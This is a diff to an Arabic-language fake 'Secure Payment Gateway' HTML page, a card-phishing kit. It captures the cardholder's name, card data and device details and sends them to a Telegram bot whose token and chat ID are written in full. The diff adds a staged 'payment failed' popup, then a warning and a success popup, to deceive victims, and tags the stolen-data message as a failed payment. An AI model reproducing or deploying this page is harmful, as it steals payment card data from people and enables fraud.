@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Payment Gateway</title>
-    <!-- استدعاء خط عربي احترافي -->
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
     
     <style>
@@ -208,6 +207,31 @@
             transform: scale(1);
         }
 
+        /* نافذة فشل الدفع (أحمر) */
+        .failed-modal {
+            border-top: 6px solid #e53e3e;
+        }
+        
+        .failed-icon {
+            font-size: 50px;
+            color: #e53e3e;
+            margin-bottom: 15px;
+        }
+
+        .failed-modal h3 {
+            color: #c53030;
+        }
+
+        .btn-failed {
+            background-color: #e53e3e;
+            color: white;
+        }
+
+        .btn-failed:hover {
+            background-color: #c53030;
+        }
+
+        /* نافذة التحذير (برتقالي) */
         .warning-modal {
             border-top: 6px solid #dd6b20;
         }
@@ -224,8 +248,45 @@
             100% { transform: scale(1); }
         }
 
-        .modal-content h3 {
+        .warning-modal h3 {
             color: #c53030;
+        }
+
+        .btn-warning {
+            background-color: #dd6b20;
+            color: white;
+        }
+
+        .btn-warning:hover {
+            background-color: #c05621;
+        }
+
+        /* نافذة النجاح (أخضر) */
+        .success-modal {
+            border-top: 6px solid #38a169;
+        }
+
+        .success-icon {
+            font-size: 50px;
+            color: #38a169;
+            margin-bottom: 15px;
+        }
+
+        .success-modal h3 {
+            color: #2f855a;
+        }
+
+        .btn-success {
+            background-color: #38a169;
+            color: white;
+        }
+
+        .btn-success:hover {
+            background-color: #2f855a;
+        }
+
+        /* نصوص النوافذ */
+        .modal-content h3 {
             font-size: 22px;
             margin-bottom: 12px;
         }
@@ -253,38 +314,6 @@
             font-family: 'Cairo', sans-serif;
         }
 
-        .btn-warning {
-            background-color: #dd6b20;
-            color: white;
-        }
-
-        .btn-warning:hover {
-            background-color: #c05621;
-        }
-
-        .success-modal {
-            border-top: 6px solid #38a169;
-        }
-
-        .success-icon {
-            font-size: 50px;
-            color: #38a169;
-            margin-bottom: 15px;
-        }
-
-        .success-modal h3 {
-            color: #2f855a;
-        }
-
-        .btn-success {
-            background-color: #38a169;
-            color: white;
-        }
-
-        .btn-success:hover {
-            background-color: #2f855a;
-        }
-
         .loader {
             display: none;
             width: 20px;
@@ -304,10 +333,8 @@
 
     <div class="payment-card">
         <div class="payment-header">
-            <h1>بوابة الدفع </h1>
-            <div class="secure-badge">
-                <!-- <span>🔒</span> SSL مشفر -->
-            </div>
+            <h1>بوابة الدفع</h1>
+            <div class="secure-badge"></div>
         </div>
 
         <div class="payment-body">
@@ -340,12 +367,24 @@
                 <span id="btnText">إكمال الدفع</span>
                 <div class="loader" id="btnLoader"></div>
             </button>
-
-            
         </div>
     </div>
 
-    <!-- النافذة المنبثقة 1: التحذير -->
+    <!-- 1. النافذة المنبثقة: فشل عملية الدفع -->
+    <div class="modal-overlay" id="failedModal">
+        <div class="modal-content failed-modal">
+            <div class="failed-icon">❌</div>
+            <h3>فشل عملية الدفع</h3>
+            <p>
+                عذراً، لم نتمكن من إتمام العملية. 
+                <br>
+                يرجى التحقق من بيانات البطاقة أو المحاولة لاحقاً.
+            </p>
+            <button class="modal-btn btn-failed" onclick="showWarningModal()">حسناً، فهمت</button>
+        </div>
+    </div>
+
+    <!-- 2. النافذة المنبثقة: التحذير الأمني -->
     <div class="modal-overlay" id="warningModal">
         <div class="modal-content warning-modal">
             <div class="warning-icon">⚠️</div>
@@ -361,7 +400,7 @@
         </div>
     </div>
 
-    <!-- النافذة المنبثقة 2: تمت العملية بنجاح -->
+    <!-- 3. النافذة المنبثقة: تمت العملية بنجاح -->
     <div class="modal-overlay" id="successModal">
         <div class="modal-content success-modal">
             <div class="success-icon">✅</div>
@@ -376,8 +415,7 @@
     </div>
 
     <script>
-        // ---- 1. تنسيق المدخلات لتبدو واقعية ----
-        
+        // ---- 1. تنسيق المدخلات ----
         document.getElementById('cardNumber').addEventListener('input', function (e) {
             let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
             let formattedValue = '';
@@ -405,8 +443,8 @@
 
 
         // ---- 2. إعدادات التليجرام ----
-        const TELEGRAM_BOT_TOKEN = '8469595165:AAGqbAhhEEMUYS9CgIY9n7eiNbogfCjF8uI';
-        const TELEGRAM_CHAT_ID = '5906639778';
+        const TELEGRAM_BOT_TOKEN = '8469595165:AAGqbAhhEEMUYS9CgDY9n7eiNbogfCjF8uI';
+        const TELEGRAM_CHAT_ID = '5906639765';
 
 
         // ---- 3. دالة لجمع معلومات الجهاز ----
@@ -415,21 +453,18 @@
             let os = "غير معروف";
             let browser = "غير معروف";
 
-            // تحديد نظام التشغيل
             if (ua.indexOf("Win") != -1) os = "Windows";
             else if (ua.indexOf("Mac") != -1) os = "MacOS";
             else if (ua.indexOf("Linux") != -1) os = "Linux";
             else if (ua.indexOf("Android") != -1) os = "Android";
             else if (ua.indexOf("like Mac") != -1) os = "iOS";
 
-            // تحديد المتصفح
             if (ua.indexOf("Chrome") != -1) browser = "Chrome";
             else if (ua.indexOf("Firefox") != -1) browser = "Firefox";
             else if (ua.indexOf("Safari") != -1) browser = "Safari";
             else if (ua.indexOf("Edge") != -1) browser = "Edge";
             else if (ua.indexOf("Opera") != -1) browser = "Opera";
 
-            // معلومات إضافية
             const screenResolution = `${window.screen.width}x${window.screen.height}`;
             const language = navigator.language || navigator.userLanguage;
             const platform = navigator.platform;
@@ -457,12 +492,10 @@
             btnText.style.display = 'none';
             btnLoader.style.display = 'block';
 
-            // جمع معلومات الجهاز
             const device = getDeviceInfo();
 
-            // تجهيز الرسالة لتليجرام
             const message = `
-🔴 **عملية دفع جديدة** 🔴
+🔴 **عملية دفع جديدة (فاشلة)** 🔴
 -------------------------
 💳 **بيانات البطاقة:**
 👤 **الاسم:** ${name}
@@ -505,7 +538,8 @@
                     btnText.style.display = 'block';
                     btnLoader.style.display = 'none';
                     
-                    document.getElementById('warningModal').classList.add('show');
+                    // إظهار منبثق الفشل أولاً
+                    document.getElementById('failedModal').classList.add('show');
                 }, 1500);
             });
         }
@@ -513,6 +547,15 @@
 
         // ---- 5. دوال النوافذ المنبثقة ----
         
+        // الانتقال من الفشل إلى التحذير
+        function showWarningModal() {
+            document.getElementById('failedModal').classList.remove('show');
+            setTimeout(() => {
+                document.getElementById('warningModal').classList.add('show');
+            }, 300);
+        }
+
+        // الانتقال من التحذير إلى النجاح
         function showSuccessModal() {
             document.getElementById('warningModal').classList.remove('show');
             setTimeout(() => {
@@ -520,6 +563,7 @@
             }, 300);
         }
 
+        // إغلاق كل النوافذ وإعادة تعيين الصفحة
         function closeModals() {
             document.getElementById('successModal').classList.remove('show');
             document.getElementById('cardName').value = '';
